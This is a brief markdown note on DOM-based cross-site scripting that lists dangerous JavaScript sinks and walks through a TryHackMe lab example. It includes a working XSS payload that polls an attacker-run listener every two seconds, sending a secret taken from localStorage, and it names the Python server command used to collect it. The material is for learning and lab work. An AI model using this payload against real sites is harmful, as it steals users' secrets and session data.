## Document object model

<ins>**Sinks** (**dangerous execution points**)</ins>
* innerHTML
* outerHTML
* insertAdjacentHTML
* document.write
* eval
* Function
* setTimeout(string)
* v-html (Vue)

<ins>**EXAMPLE**</ins>

*Based on Vite app tryhackme challenge*

Java code found in debugger bdays.vue
```
 removeBday(bdayID) {
      var secret = localStorage.getItem('secret');
      const path = `http://lists.tryhackme.loc:5001/bdays/${bdayID}?secret=`;
      axios.delete(path + secret)
        .then((res) => {
          this.getBdays();
          this.message = res.data.message;
          this.showMessage = true;
        })
```
XSS Payload: using ```python -m http.server 8000``` to grab the secret code.
```
<img src="x" onerror="setInterval(function() {fetch('http://192.168.160.106:8000?secret=' + encodeURIComponent(localStorage.getItem('secret'))).then(response => {})},2000);">
```
